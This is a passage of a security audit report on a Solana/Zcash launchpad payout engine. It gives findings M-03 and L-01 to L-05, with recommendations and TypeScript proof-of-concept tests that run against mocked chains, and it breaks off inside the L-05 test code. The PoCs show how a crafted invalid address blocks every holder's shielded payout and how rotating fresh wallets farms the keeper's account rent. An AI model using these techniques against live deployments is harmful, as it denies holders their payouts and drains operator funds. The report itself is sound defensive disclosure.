    /^(PAD_|ZCASH_|TREASURY_|SOLANA_|KEEPER_|HELIUS_|DEVNET_|NEAR|PAYOUTS_)/.test(
      k,
    )
  )
    delete process.env[k];
Object.assign(process.env, {
  PAD_MODE: "devnet",
  PAD_DB_FILE: join(TMP, "pad.sqlite"),
  PAD_PAUSE_FILE: join(TMP, "PAUSED"),
  PAD_STUCK_MAX_ATTEMPTS: "3", // lowered from 24 so the parking shows within 5 runs
  KEEPER_KEYPAIR_PATH: join(TMP, "keeper.json"),
  SOLANA_DEVNET_RPC: "http://127.0.0.1:9",
  ZCASH_LIGHTWALLETD: "127.0.0.1:9",
  ZCASH_DEVTOOL_BIN: DEVTOOL,
  ZCASH_DEVTOOL_SHA256: createHash("sha256")
    .update(readFileSync(DEVTOOL))
    .digest("hex"),
  TREASURY_WALLET_DIR: WALLET,
  TREASURY_IDENTITY_FILE: join(TMP, "treasury.age"),
});
const db = await import("../engine/src/db");
const { claimRemainingCoins, runEpoch } =
  await import("../engine/src/epoch/engine");
const { issueNonce, registerOptin } =
  await import("../engine/src/optin/registry");
const { optinMessage } = await import("../engine/src/optin/message");
afterAll(() => rmSync(TMP, { recursive: true, force: true }));

/** The engine logs its retries and the snapshot memo it cannot send here (no Solana RPC, by design); muted to keep the output readable. */
async function quietly<T>(fn: () => Promise<T>): Promise<T> {
  const { error, warn, log } = console;
  console.error = console.warn = console.log = () => {};
  try {
    return await fn();
  } finally {
    Object.assign(console, { error, warn, log });
  }
}

// ---- The attacker: a real ed25519 (Solana) keypair, so the opt-in goes through the real signature check ----
const B58 = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
function base58(bytes: Uint8Array): string {
  let n = BigInt(`0x${Buffer.from(bytes).toString("hex")}`);
  let out = "";
  while (n > 0n) {
    out = B58[Number(n % 58n)] + out;
    n /= 58n;
  }
  for (const b of bytes) {
    if (b !== 0) break;
    out = `1${out}`;
  }
  return out;
}
const attackerKeys = generateKeyPairSync("ed25519");
const ATTACKER = base58(
  Buffer.from(attackerKeys.publicKey.export({ format: "jwk" }).x!, "base64url"),
);
const signAsAttacker = (text: string) =>
  base58(sign(null, Buffer.from(text, "utf8"), attackerKeys.privateKey));

// ---- One launched legacy 1% coin (holders get 31.25% of a claim); three honest opted-in holders ----
db.upsertCoin({
  mint: "COIN_A",
  name: "COIN_A",
  symbol: "COIN_A",
  imageUrl: "",
  description: "",
  creator: "creator-a",
  createdAt: new Date().toISOString(),
  feeBps: 100,
  poolId: null,
  mintDecimals: 6,
  status: "pending",
});
db.markCoinLaunched("COIN_A", "pool-a");
const HONEST = ["honest-1", "honest-2", "honest-3"];
for (const w of HONEST) db.upsertOptin(w, `utest1-${w}-address`); // opted in earlier with valid addresses

let roundHolders: string[] = [];
let claimsOpen = false; // a round's claim happens in the run that starts its epoch; later runs only progress it
const deps: ClaimDeps = {
  claimCoin: async () => 12_800_000n, // 4,000,000 zats to the holders, split equally
  currentHolders: async () =>
    roundHolders.map((wallet) => ({ wallet, balance: 100n })),
  ensureConfig: async () => {},
  recordExclusions: async () => {},
};
const submits: bigint[] = [];
const swap: SwapAdapter = {
  provider: "near-1click",
  quote: async () => ({ outZats: 0n }),
  submit: async (amount) => {
    submits.push(amount);
    return { ref: String(submits.length - 1) };
  },
  status: async (ref) => ({
    status: "settled",
    amountOutZats: submits[Number(ref)]! - 30_000n,
  }), // settles at once
};
const isolation: IsolationDeps = {
  keeperZecBalance: async () => 10n ** 15n,
  treasurySpendableZats: async () => 10n ** 15n,
}; // the treasury does hold the settled swaps' ZEC
/** One keeper run; returns the error it ended with, if any (a parked epoch's errors are only logged by the engine). */
const run = () =>
  quietly(() =>
    runEpoch(
      swap,
      (id) => (claimsOpen ? claimRemainingCoins(id, deps) : Promise.resolve()),
      { isolation, includeShielded: true },
    ),
  ).then(
    () => "no error surfaced",
    (e: Error) => e.message.trim(),
  );

const payCalls = () =>
  (
    JSON.parse(readFileSync(join(WALLET, "fake-state.json"), "utf8")) as {
      payCalls: number;
    }
  ).payCalls;
const newestEpoch = () =>
  (
    db
      .getDb()
      .query("SELECT id FROM epochs ORDER BY at DESC LIMIT 1")
      .get() as { id: string }
  ).id;
const shieldedRows = (id: string) =>
  db.getPayouts(id).filter((p) => p.kind === "shielded");
const paid = (id: string) =>
  `${shieldedRows(id).filter((p) => p.sentAt !== null).length}/${shieldedRows(id).length} rows paid`;

describe("M-03: an invalid Orchard receiver blocks every opted-in holder's shielded payout", () => {
  test("the crafted address passes the pad's signed opt-in", () => {
    const { nonce } = issueNonce(ATTACKER);
    const result = registerOptin(
      ATTACKER,
      BAD_UA,
      nonce,
      signAsAttacker(optinMessage(ATTACKER, BAD_UA, nonce)),
    );
    console.log(
      `[opt-in] registerOptin(attacker, ${BAD_UA.slice(0, 12)}…${BAD_UA.slice(-6)}) -> ${JSON.stringify(result)}`,
    );
    expect(result.ok).toBe(true);
    expect(db.getOptin(ATTACKER)).toMatchObject({
      zcashAddress: BAD_UA,
      active: 1,
    });
  });

  test("control: a round without the attacker's row pays every honest holder in one run", async () => {
    const before = payCalls();
    roundHolders = HONEST;
    claimsOpen = true;
    await run();
    claimsOpen = false;
    const id = newestEpoch();
    console.log(
      `[control] honest holders only: ${paid(id)} in 1 run, pay called ${payCalls() - before} time`,
    );
    expect(shieldedRows(id).every((p) => p.sentAt !== null)).toBe(true);
    expect(payCalls() - before).toBe(1);
  });

  test("bug: once the attacker's row is planned, no opted-in holder is paid, run after run, and later rounds are blocked too", async () => {
    const before = payCalls();
    roundHolders = [...HONEST, ATTACKER];
    claimsOpen = true;
    const firstError = await run();
    claimsOpen = false;
    const id = newestEpoch();
    console.log(
      `[bug] run 1: swap ${db.getEpoch(id)!.swapState}, then "${firstError}": ${paid(id)}`,
    );
    for (let i = 2; i <= 5; i++) {
      await run();
      console.log(
        `[bug] run ${i}: pay attempts so far ${payCalls() - before}, ${paid(id)}, epoch ${db.getEpoch(id)!.status}`,
      );
    }
    const e = db.getEpoch(id)!;
    console.log(
      `[bug] after 5 runs: ${payCalls() - before} pay attempts, ${paid(id)}, epoch ${e.status}; the holders' ZEC sits in the treasury (swap ${e.swapState})`,
    );
    expect(payCalls() - before).toBe(5);
    expect(shieldedRows(id)).toHaveLength(4);
    expect(shieldedRows(id).every((p) => p.sentAt === null)).toBe(true);
    expect(e).toMatchObject({
      status: "needs_attention",
      swapState: "settled",
    });

    claimsOpen = true; // the next shielded round
    await run();
    claimsOpen = false;
    const next = newestEpoch();
    console.log(
      `[bug] next shielded round (plans the attacker again): ${paid(next)}`,
    );
    expect(next).not.toBe(id);
    expect(shieldedRows(next).length).toBe(4);
    expect(shieldedRows(next).every((p) => p.sentAt === null)).toBe(true);
  });
});
```

</details>

The following sequence demonstrates the impact:

1. **Opt-in:** The attacker registers the invalid address through the real `registerOptin` flow using a valid wallet signature. Registration succeeds.
2. **Control:** With only three legitimate holders opted in, all three receive their payments successfully in one batch.
3. **Attack:** The attacker becomes eligible for a payout. The epoch plans four shielded recipients and successfully settles the swap.
4. **Batch failure:** The shielded payout command rejects the attacker's address, causing the entire batch to fail. None of the four recipients receives payment.
5. **Persistent failure:** Subsequent runs retry the same batch and fail again. The epoch eventually requires attention, but subsequent rounds remain vulnerable as long as the attacker's row is included.

The PoC also verifies that the team's payout is skipped when the shielded leg fails.

## Recommendation

Validate unified addresses using the same `zcash_keys::UnifiedAddress::try_from` conversion performed by the payout command during opt-in registration. Reject addresses containing invalid receivers and revalidate existing registered addresses.

Additionally, isolate invalid recipients during payout processing. If a batch fails before transaction construction, identify the offending address, carry forward and close its payout with an appropriate reason, and retry the remaining valid recipients. Deactivate the offending wallet's opt-in to prevent the same issue from affecting future rounds.

## Team Response

Fixed.

# [L-01] Epoch Snapshots Publish an Incorrect Team Share, Causing Valid Epochs to Fail Verification

## Severity

Low Risk

## Description

The epoch engine calculates the team's share independently for each coin based on its fee tier and creator share. However, `writeSnapshot()` (`engine/src/epoch/engine.ts:466-482`) publishes a single global `teamShareBps` value for every coin instead of the rate actually used during the payout calculation.

This causes a mismatch with the public snapshot verifier (`engine/scripts/verify-snapshot.ts`), which checks whether each coin's team allocation equals its claimed amount multiplied by the published team-share rate.

With the default `PAD_TEAM_SHARE_BPS` of 6,875, the actual team-share rates vary depending on the coin:

- **6,875 bps:** Legacy 1% coins without a creator share.
- **5,833 bps:** Current 1% tier with a 25% creator share.
- **3,750 bps:** 2%, 4%, 6%, and 10% tiers with a 50% creator share.
- **2,500 bps:** Released orphan buckets.

Because the snapshot publishes 6,875 bps for every coin, any epoch containing a current-tier coin or an orphan release fails the public verifier, despite the engine calculating and distributing the correct amounts.

The issue also undermines the verifier's ability to detect incorrect team allocations. For example, an incorrectly increased team share could pass verification if it matches the globally published rate, even when it violates the actual policy for that coin.

Additionally, the published snapshot misrepresents the holders' share of the claim. Since the snapshot hash is recorded on-chain, these incorrect records are permanently committed.

No funds are directly lost, but the public proof of correct payouts becomes unreliable, and valid epochs can fail the project's own verification process.

## Location of Affected Code

File: [`engine/src/epoch/engine.ts#L471`](https://github.com/snarkspad-audit/snarkspad-engine-audit/blob/afe55f055a951a4282b1a23052e1995fbbf536d3/engine/src/epoch/engine.ts#L471) (`writeSnapshot`)

File: [`engine/src/ledger.ts#L126`](https://github.com/snarkspad-audit/snarkspad-engine-audit/blob/afe55f055a951a4282b1a23052e1995fbbf536d3/engine/src/ledger.ts#L126) (`/api/treasury`)

## Proof of Concept

The PoC reproduces the issue using the real `runEpoch()` flow with the default `PAD_TEAM_SHARE_BPS` of 6,875.

The test creates four payout entries, each with a claim of 1,000,000 zats, except the orphan bucket, which contains 400,000 zats.

The engine correctly calculates the following team allocations:

| Coin          | Actual team share | Team allocation |
| ------------- | ----------------: | --------------: |
| NEW_1PCT      |         5,833 bps |         583,300 |
| NEW_2PCT      |         3,750 bps |         375,000 |
| LEGACY_1PCT   |         6,875 bps |         687,500 |
| ORPHAN_BUCKET |         2,500 bps |         100,000 |

However, the generated snapshot publishes 6,875 bps for all four entries. Running the verifier's `arithmeticProblems` against the snapshot reports mismatches for `NEW_1PCT`, `NEW_2PCT`, and `ORPHAN_BUCKET`. Only `LEGACY_1PCT` passes verification.

## Recommendation

Publish the actual team-share rate used for each coin rather than a single global rate. Store the calculated rate alongside each harvest entry and include it in the corresponding snapshot entry.

The verifier should independently calculate the expected rate using the coin's fee tier, creator share, and orphan-release status rather than blindly trusting the published rate. This ensures it can detect incorrect team allocations instead of simply validating them against engine-provided values.

Additionally, update `/api/treasury` to expose accurate per-tier rates or publish the holders' share of the fee instead of a misleading global share of the claim.

## Team Response

Fixed.

# [L-02] Fresh Wallets Bypass the Rent Guard and Can Exhaust the Keeper's SOL

## Severity

Low Risk

## Description

The Solana payout flow (`engine/src/epoch/engine.ts:521-547`) allows the keeper to create recipients' ZEC token accounts and pay their rent when processing payouts. Recipients without an existing token account are eligible for keeper-funded account creation only when their payout exceeds `PAD_NEW_ACCOUNT_MIN_ZATS` (30,000 zats). Smaller payouts are carried forward.

To prevent rent farming, the engine records accounts whose rent it has funded and refuses to fund the same account again if it has subsequently been closed (`account_closed_after_keeper_paid_rent`).

However, this protection is keyed to the token account address, which is derived from the recipient's wallet. A holder can bypass it by distributing their stake across fresh wallets. Each new wallet has a token account the keeper has never funded, allowing the keeper to pay its rent again.

An attacker can therefore move their stake between fresh wallets before each payout round, ensuring each wallet receives more than the 30,000-zat minimum. After receiving their rewards, they can transfer the ZEC out and close the token accounts, recovering the account rent while the keeper bears the cost.

There is no limit on the number of new accounts the keeper can fund per round or on the total rent expenditure. At the mainnet rent of approximately 0.00149 SOL per account, funding 100 accounts costs approximately 0.149 SOL, consuming roughly 74% of the keeper's 0.2 SOL operational float. Just 135 new accounts can exhaust it.

Once the keeper runs out of SOL, subsequent claims and payouts fail until the wallet is replenished. Although the `keeper_sol_low` alert detects low balances, it triggers below 0.05 SOL, after the rent expenditure has already occurred.

This bypasses the existing rent-farming mitigation documented in the threat model. The 30,000-zat payout floor does not guarantee that the keeper recovers its rent expenditure, particularly when ZEC's value falls relative to SOL.

## Location of Affected Code

File: [`engine/src/epoch/engine.ts#L526-L537`](https://github.com/snarkspad-audit/snarkspad-engine-audit/blob/afe55f055a951a4282b1a23052e1995fbbf536d3/engine/src/epoch/engine.ts#L526-L537) (`sendSolanaLeg()`: the keeper creates and pays for each payable wallet's new account)

File: [`engine/src/epoch/solanaPayout.ts#L111-L118`](https://github.com/snarkspad-audit/snarkspad-engine-audit/blob/afe55f055a951a4282b1a23052e1995fbbf536d3/engine/src/epoch/solanaPayout.ts#L111-L118)

## Proof of Concept

The PoC reproduces the issue using the real `runEpoch()` payout flow, including account-policy checks and funded-account tracking. Only chain access is mocked.

<details>
<summary>Proof of Concept code</summary>

```ts
import { afterAll, describe, expect, mock, test } from "bun:test";
import { generateKeyPairSync } from "node:crypto";
import { mkdtempSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import type { ClaimDeps } from "../engine/src/epoch/engine";
import type { SolanaPayoutHooks } from "../engine/src/epoch/solanaPayout";
import type { IsolationDeps } from "../engine/src/epoch/stuck";
import type { SwapAdapter } from "../engine/src/swap/types";

// The engine reads its configuration once per process, so each PoC needs a process of its own.
const pocProcess = globalThis as { padPoc?: string };
if (pocProcess.padPoc)
  throw new Error(
    `run each PoC in its own process (bash issues/run-pocs.sh): ${pocProcess.padPoc} already configured the engine here`,
  );
pocProcess.padPoc = "L-02";

// ---- Isolated environment: temp database, every RPC on a closed local port (nothing leaves the machine) ----
const TMP = mkdtempSync(join(tmpdir(), "poc-l02-"));
for (const k of Object.keys(process.env))
  if (
    /^(PAD_|ZCASH_|TREASURY_|SOLANA_|KEEPER_|HELIUS_|DEVNET_|NEAR|PAYOUTS_)/.test(
      k,
    )
  )
    delete process.env[k];
Object.assign(process.env, {
  PAD_MODE: "local",
  PAD_DB_FILE: join(TMP, "pad.sqlite"),
  PAD_PAUSE_FILE: join(TMP, "PAUSED"),
  KEEPER_KEYPAIR_PATH: join(TMP, "keeper.json"),
  SOLANA_LOCAL_RPC: "http://127.0.0.1:9",
  ZCASH_RPC_URL: "http://127.0.0.1:9",
  ZCASH_LIGHTWALLETD: "127.0.0.1:9",
});

const realMultiAccounts = { ...(await import("../engine/src/multiAccounts")) };
mock.module("../engine/src/multiAccounts", () => ({
  ...realMultiAccounts,
  readAccountsInfo: async (keys: unknown[]) => keys.map(() => null), // no ZEC account: a fresh wallet, or one whose owner closed it
}));
const realPayout = { ...(await import("../engine/src/epoch/solanaPayout")) };
mock.module("../engine/src/epoch/solanaPayout", () => ({
  ...realPayout,
  /** The batch is recorded pending, broadcast and confirmed (solanaPayout.ts:207-209); the keeper is its fee payer and pays each new account's rent. */
  sendSolanaZecPayouts: async (
    shares: { wallet: string; amount: bigint }[],
    hooks: SolanaPayoutHooks,
  ) => {
    const wallets = shares.map((s) => s.wallet);
    const sig = `batch-${crypto.randomUUID()}`;
    await hooks.onPending(wallets, sig, {
      rawTx: Buffer.from("signed batch").toString("base64"),
      lastValidBlockHeight: 1_000,
    });
    await hooks.onSent(wallets, sig);
    return {
      sentSigsByWallet: new Map(wallets.map((w) => [w, sig])),
      skipped: [],
    };
  },
}));

const db = await import("../engine/src/db");
const { config } = await import("../engine/src/config");
const { claimRemainingCoins, runEpoch } =
  await import("../engine/src/epoch/engine");
afterAll(() => rmSync(TMP, { recursive: true, force: true }));

/** The engine logs the snapshot memo it cannot send here (no Solana RPC, by design); muted to keep the output readable. */
async function quietly<T>(fn: () => Promise<T>): Promise<T> {
  const { error, warn, log } = console;
  console.error = console.warn = console.log = () => {};
  try {
    return await fn();
  } finally {
    Object.assign(console, { error, warn, log });
  }
}

/** A fresh, real (on-curve) Solana wallet address. */
const B58 = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
function freshWallet(): string {
  const raw = Buffer.from(
    generateKeyPairSync("ed25519").publicKey.export({ format: "jwk" }).x!,
    "base64url",
  );
  let n = BigInt(`0x${raw.toString("hex")}`);
  let out = "";
  while (n > 0n) {
    out = B58[Number(n % 58n)] + out;
    n /= 58n;
  }
  for (const b of raw) {
    if (b !== 0) break;
    out = `1${out}`;
  }
  return out;
}

const RENT_LAMPORTS = 1_488_440;
const FLOAT_LAMPORTS = 200_000_000;
const sol = (lamports: number) => (lamports / 1e9).toFixed(4);

db.upsertCoin({
  mint: "COIN",
  name: "COIN",
  symbol: "COIN",
  imageUrl: "",
  description: "",
  creator: "creator",
  createdAt: new Date().toISOString(),
  feeBps: 100,
  poolId: null,
  mintDecimals: 6,
  status: "pending",
});
db.markCoinLaunched("COIN", "pool");
const isolation: IsolationDeps = {
  keeperZecBalance: async () => 10n ** 15n,
  treasurySpendableZats: async () => 10n ** 15n,
};
const noSwap: SwapAdapter = {
  provider: "simulated",
  quote: async () => ({ outZats: 0n }),
  submit: async () => ({ ref: "" }),
  status: async () => ({ status: "pending" }),
};
const fundedSoFar = () =>
  (
    db.getDb().query("SELECT COUNT(*) AS n FROM keeper_funded_atas").get() as {
      n: number;
    }
  ).n;

/** One payout round in which the attacker's stake sits in `wallets`, equal weights: 4,000,000 zats to holders, 40,000 each for 100 wallets. */
async function round(wallets: string[]) {
  const deps: ClaimDeps = {
    claimCoin: async () => 12_800_000n, // legacy 1% coin: holders get 31.25% of the claim = 4,000,000 zats
    currentHolders: async () =>
      wallets.map((wallet) => ({ wallet, balance: 1_000n })),
    ensureConfig: async () => {},
    recordExclusions: async () => {},
  };
  const before = fundedSoFar();
  const out = await quietly(() =>
    runEpoch(noSwap, (id) => claimRemainingCoins(id, deps), {
      isolation,
      includeShielded: false,
    }),
  );
  const id = out.epoch!.id;
  const rows = db.getPayouts(id).filter((p) => p.kind === "solana");
  await Bun.sleep(5); // epoch ids are millisecond timestamps
  return {
    funded: fundedSoFar() - before,
    paid: rows.filter((p) => p.sig?.startsWith("batch-")).length,
    deferred: rows.filter(
      (p) => p.sig === "carried:account_closed_after_keeper_paid_rent",
    ).length,
    each: rows[0] ? BigInt(rows[0].amountZats) : 0n,
  };
}

describe("L-02: fresh wallets every round farm the keeper's account rent", () => {
  test("the guard stops a reused wallet, but a fresh one is funded again every round, with no cap", async () => {
    const first = Array.from({ length: 100 }, freshWallet);
    const r1 = await round(first);
    console.log(
      `round 1, 100 fresh wallets: ${r1.paid} paid ${r1.each} zats each (floor ${config.epoch.newAccountMinZats}); keeper funded ${r1.funded} new ZEC accounts = ${sol(r1.funded * RENT_LAMPORTS)} SOL of rent`,
    );
    console.log(
      `  -> the attacker moves the ZEC out and closes the 100 accounts, keeping the ${sol(r1.funded * RENT_LAMPORTS)} SOL`,
    );

    const r2 = await round(first);
    console.log(
      `round 2, the same 100 wallets: ${r2.deferred} deferred (account_closed_after_keeper_paid_rent), ${r2.funded} funded: the guard works for reuse`,
    );

    const second = Array.from({ length: 100 }, freshWallet);
    const r3 = await round(second);
    console.log(
      `round 3, stake moved to 100 new fresh wallets: keeper funded ${r3.funded} new accounts = ${sol(r3.funded * RENT_LAMPORTS)} SOL again`,
    );

    const total = (r1.funded + r3.funded) * RENT_LAMPORTS;
    console.log(
      `total rent paid by the keeper at mainnet rent: ${sol(total)} SOL; one round of 100 wallets is ${Math.round((100 * r1.funded * RENT_LAMPORTS) / FLOAT_LAMPORTS)}% of the 0.2 SOL float (GO-NO-GO R1), and ${Math.ceil(FLOAT_LAMPORTS / RENT_LAMPORTS)} fresh wallets empty it`,
    );
    console.log(
      `rent per account ${(RENT_LAMPORTS / 1e9).toFixed(8)} SOL vs the 30,000-zat floor (0.0003 ZEC): the rent is worth more than the payout whenever ZEC trades below ${(RENT_LAMPORTS / 1e9 / 0.0003).toFixed(1)}x SOL`,
    );

    expect(r1).toMatchObject({ paid: 100, funded: 100 });
    expect(r1.each).toBeGreaterThan(config.epoch.newAccountMinZats);
    expect(r2).toMatchObject({ funded: 0, deferred: 100 });
    expect(r3).toMatchObject({ paid: 100, funded: 100 });
    expect(Math.ceil(FLOAT_LAMPORTS / RENT_LAMPORTS)).toBe(135);
  }, 300_000);
});
```

</details>

The test uses a legacy 1% coin generating 4,000,000 zats in holder rewards per round, distributed equally across 100 attacker-controlled wallets.

1. Round 1: 100 fresh wallets are each paid 40,000 zats, above the 30,000 floor. The keeper creates 100 new ZEC accounts = 0.1488 SOL of rent.
2. The attacker withdraws: they move the ZEC out, close the 100 accounts, and keep the 0.1488 SOL.
3. Round 2, same 100 wallets: the guard defers all 100 (account_closed_after_keeper_paid_rent), and 0 accounts are funded. The guard works for reused wallets.
4. Round 3: the attacker has moved the stake to 100 new fresh wallets. The keeper funds 100 accounts again = 0.1488 SOL.

Result: the keeper paid 0.2977 SOL of rent over two rounds.

## Recommendation

Prefer requiring recipients to create their own ZEC token accounts before becoming eligible for Solana payouts. Alternatively, deduct the account-creation cost from the recipient's payout.

## Team Response

Fixed.

# [L-03] A Single Coin's Slow Holder Scan Can Stall Claims for Every Coin

## Severity

Low Risk

## Description

During each epoch, `claimRemainingCoins()` calls `admitCoin()` (`engine/src/epoch/engine.ts:220-259`) for every launched coin. Before claiming a coin's fees, the engine reads its current holders and records their balances as fixed reward weights. This requires a `getProgramAccounts()` scan of the coin's token accounts (`engine/src/holders.ts:40-42`).

These RPC requests pass through `engine/src/rpcGuard.ts`, where holder scans have a 20-second timeout (`PAD_RPC_SCAN_TIMEOUT_MS`). If a scan times out, the RPC guard throws a `ChainUnavailableError`, which the engine interprets as a chain-wide outage (`engine.ts:239-241`).

However, a slow holder scan only affects the coin being scanned; it does not necessarily indicate that the Solana RPC provider or network is unavailable. Because the error is treated as a chain outage, the engine aborts the entire claim process, preventing other coins from being processed.

This violates the intended per-coin isolation where failures affecting one coin should not prevent other coins from progressing.

The problem can persist across subsequent runs. The scheduler backs off and retries after a successful `getSlot()` probe, but the same draft epoch is resumed and the problematic coin's scan times out again. As a result, even coins whose holder weights have already been successfully recorded remain unclaimed. No new epoch can start while the draft remains open.

An attacker could increase the number of token accounts associated with a coin to make its holder scan more expensive, potentially triggering this condition. A coin with naturally high holder activity or an RPC provider struggling with large scans could also cause it.

Although no funds are lost, fee claims and subsequent payouts for all coins remain stalled until the problematic scan succeeds, an operator intervenes, or the affected holder samples expire after 30 days. The engine also fails to generate a persistent alert identifying the problematic coin, instead logging generic chain availability events.

## Location of Affected Code

File: [`engine/src/epoch/engine.ts#L236-L244`](https://github.com/snarkspad-audit/snarkspad-engine-audit/blob/afe55f055a951a4282b1a23052e1995fbbf536d3/engine/src/epoch/engine.ts#L236-L244) (`admitCoin()`)

## Recommendation

Distinguish coin-specific holder scan failures from actual chain outages. When a holder scan fails with `ChainUnavailableError`, perform a lightweight RPC health check, such as `getSlot()`, through the same RPC guard. If the health check succeeds, treat the failure as specific to that coin, skip its processing for the current run, and allow other coins to proceed. Only abort the entire claim process if the health check also fails.

## Team Response

Fixed.

# [L-04] Late-Confirmed Solana Payout Batches Leave Keeper-Funded Accounts Unrecorded

## Severity

Low Risk

## Description

When a Solana payout recipient has no ZEC token account, the keeper creates the account through `create-ATA-idempotent` and pays its rent (`engine/src/epoch/solanaPayout.ts:196`). Because the recipient can later close the account and retain the rent, the closed-account guard prevents the keeper from funding the same account again. `applyAccountPolicy()` defers payouts when an ATA is recorded in `keeper_funded_atas` but no longer exists (`solanaPayout.ts:152-164`).

The guard relies on `recordFundedAccounts()` (`engine/src/epoch/engine.ts:514-519`) to record accounts created by the current batch. However, this recording happens only in the sending run's `onSent()` callback (`engine.ts:534-537`). If the batch remains pending because confirmation exceeds the 20-second timeout, or the keeper stops after broadcasting, a later run can settle it through `resumePendingSolanaBatches()` without recording the newly created accounts. The pending-batch record stores only the signature and signed bytes (`engine/src/db.ts:1189-1196`), so the original `newAccounts` map is unavailable during recovery.

Consequently, after the recipient closes the ATA, the next payout is not deferred: the keeper creates the account again and pays its rent a second time. This bypasses accounts created by batches that are confirmed on a later run. The additional cost is approximately 0.00149 SOL per affected account. Although the loss is limited and the recipient cannot force a batch to confirm late, the recovery path fails to preserve the state required by the guard.

## Location of Affected Code

File: [`engine/src/epoch/engine.ts:508`](https://github.com/snarkspad-audit/snarkspad-engine-audit/blob/afe55f055a951a4282b1a23052e1995fbbf536d3/engine/src/epoch/engine.ts#L508) (`resumePendingSolanaBatches()`)

File: [`engine/src/epoch/engine.ts#L534-L537`](https://github.com/snarkspad-audit/snarkspad-engine-audit/blob/afe55f055a951a4282b1a23052e1995fbbf536d3/engine/src/epoch/engine.ts#L534-L537)

## Proof of Concept

1. **Control:** The batch confirms during the sending run. The payout is marked sent and the ATA is recorded in `keeper_funded_atas`.
2. **Control:** The owner closes the ATA. The next payout is deferred with `account_closed_after_keeper_paid_rent`, confirming that the guard works.
3. **Bug:** A batch for a new wallet is broadcast but remains pending when the confirmation window expires.
4. **Bug:** On the next run, `resumePendingSolanaBatches()` finds the batch landed and marks the payout sent, but does not record the ATA.
5. **Bug:** The owner closes the ATA. The next payout proceeds, and the keeper creates and funds the account again.

## Recommendation

Persist each newly created ATA alongside its pending batch, then record it in `keeper_funded_atas` when a later run confirms that the batch landed.

Record the ATA only after the batch lands. Recording it when the batch is merely signed or broadcast could incorrectly defer future payouts for an account that was never created. Apply the same recovery logic to Solana fallback batches of the shielded leg, which use the same resume path.

## Team Response

Fixed.

# [L-05] Interrupted Squads Batch Cleanup Leaves Batch Accounts Open

## Severity

Low Risk

## Description

When `PAD_CLAIM_BATCH=1`, the keeper creates a Squads batch for each epoch and pays rent for its inner transaction accounts. After processing all coins, `claimRemainingCoins()` calls `finishRound()` to close those accounts, along with the batch and proposal, returning the rent to the keeper.

However, `finishRound()` receives only the coins admitted during the current run. If the keeper crashes or a close RPC call fails after all coins have been recorded, the next run resumes with no newly admitted coins. It therefore skips batch cleanup and finalizes the epoch, leaving the batch accounts open. Subsequent runs do not retry the cleanup, so the rent remains locked.

## Location of Affected Code

File: [`engine/src/epoch/engine.ts#L163-L170`](https://github.com/snarkspad-audit/snarkspad-engine-audit/blob/afe55f055a951a4282b1a23052e1995fbbf536d3/engine/src/epoch/engine.ts#L163-L170)

File: [`engine/src/epoch/engine.ts#L109-L117`](https://github.com/snarkspad-audit/snarkspad-engine-audit/blob/afe55f055a951a4282b1a23052e1995fbbf536d3/engine/src/epoch/engine.ts#L109-L117)

## Proof of Concept

The PoC exercises the `runEpoch()` and `claimRemainingCoins()` flow with mocked chain calls and a stand-in batch claimer.

<details>
<summary>Proof of Concept code</summary>

```ts
import { afterAll, describe, expect, mock, test } from "bun:test";
import { generateKeyPairSync } from "node:crypto";
import { mkdtempSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import type { IsolationDeps } from "../engine/src/epoch/stuck";
import type { SwapAdapter } from "../engine/src/swap/types";

/** The crash case re-runs this file as a child keeper process; that child does one run and is killed inside finishRound. */
const CHILD = process.env.L05_ROLE === "child";

// The engine reads its configuration once per process, so each PoC needs a process of its own.
const pocProcess = globalThis as { padPoc?: string };
if (pocProcess.padPoc)
  throw new Error(
    `run each PoC in its own process (bash issues/run-pocs.sh): ${pocProcess.padPoc} already configured the engine here`,
  );
pocProcess.padPoc = "L-05";

// ---- Isolated environment: temp database, every RPC on a closed local port (nothing leaves the machine) ----
const TMP = CHILD
  ? process.env.L05_TMP!
  : mkdtempSync(join(tmpdir(), "poc-l05-"));
for (const k of Object.keys(process.env))
  if (
    /^(PAD_|ZCASH_|TREASURY_|SOLANA_|KEEPER_|HELIUS_|DEVNET_|NEAR|PAYOUTS_|SQUADS_|FEE_CLAIMER|TEAM_|EPOCH_)/.test(
      k,
    )
  )
    delete process.env[k];
Object.assign(process.env, {
  PAD_MODE: "local",
  PAD_SNAPSHOT_MIN_SAMPLES: "3", // the mainnet gate
  PAD_CLAIM_BATCH: "1", // one Squads batch per round, one owner approval (claimerFor reads it; stood in below)
  EPOCH_LOCK_STALE_MS: "1000", // a restarted keeper takes a dead run's lock over once it is this old (default 10 minutes)
  PAD_DB_FILE: join(TMP, "pad.sqlite"),
  PAD_PAUSE_FILE: join(TMP, "PAUSED"),
  KEEPER_KEYPAIR_PATH: join(TMP, "keeper.json"),
  SOLANA_LOCAL_RPC: "http://127.0.0.1:9",
  ZCASH_RPC_URL: "http://127.0.0.1:9",
});

/** A real base58 public key (the config's fee claimer is parsed as one). */
const B58 = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
function newKey(): string {
  const raw = Buffer.from(
    generateKeyPairSync("ed25519").publicKey.export({ format: "jwk" }).x!,
    "base64url",
  );
  let n = BigInt(`0x${raw.toString("hex")}`);
  let out = "";
  while (n > 0n) {
    out = B58[Number(n % 58n)] + out;
    n /= 58n;
  }
  return out;
}
const VAULT = CHILD ? process.env.L05_VAULT! : newKey(); // the pad config's fee claimer: the Squads multisig's vault
const HOLDERS = [
  { wallet: "holder-1", balance: 100n },
  { wallet: "holder-2", balance: 300n },
];

// ---- Chain calls replaced (runEpoch, claimRemainingCoins, chainClaimDeps and feeClaimerAddressOf are the real code) ----
const realSetup = { ...(await import("../engine/src/dbc/setup")) };
mock.module("../engine/src/dbc/setup", () => ({
  ...realSetup,
  ensureDbcConfig: async () => ({}),
})); // the pad's config matches the chain
const realSnapshots = { ...(await import("../engine/src/epoch/snapshots")) };
mock.module("../engine/src/epoch/snapshots", () => ({
  ...realSnapshots,
  readCurrentHolders: async () => HOLDERS,
}));
const realMigrate = { ...(await import("../engine/src/dbc/migrate")) };
mock.module("../engine/src/dbc/migrate", () => ({
  ...realMigrate,
  reconcileMigration: async (coin: unknown) => coin,
})); // no curve is full
